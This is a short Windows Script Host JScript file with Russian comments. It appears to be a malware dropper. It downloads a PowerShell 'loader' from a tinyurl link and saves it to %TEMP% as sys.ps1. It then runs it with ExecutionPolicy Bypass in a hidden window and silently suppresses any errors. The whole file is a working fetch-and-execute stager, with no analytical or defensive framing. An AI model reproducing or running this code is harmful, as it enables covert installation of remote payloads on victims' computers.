try {
    var shell = new ActiveXObject("WScript.Shell");
    var xml = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0");
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    
    // Скачивание loader.ps1
    xml.open("GET", "https://tinyurl.com/42pfukca", false);
    xml.send();
    if (xml.status !== 200) { WScript.Quit(); }
    
    // Сохранение
    var psFile = shell.ExpandEnvironmentStrings("%TEMP%") + "\\sys.ps1";
    var psf = fso.CreateTextFile(psFile, true);
    psf.Write(xml.responseText);
    psf.Close();
    
    // Скрытый запуск PowerShell
    shell.Run('powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "' + psFile + '"', 0, false);
    
} catch(e) {}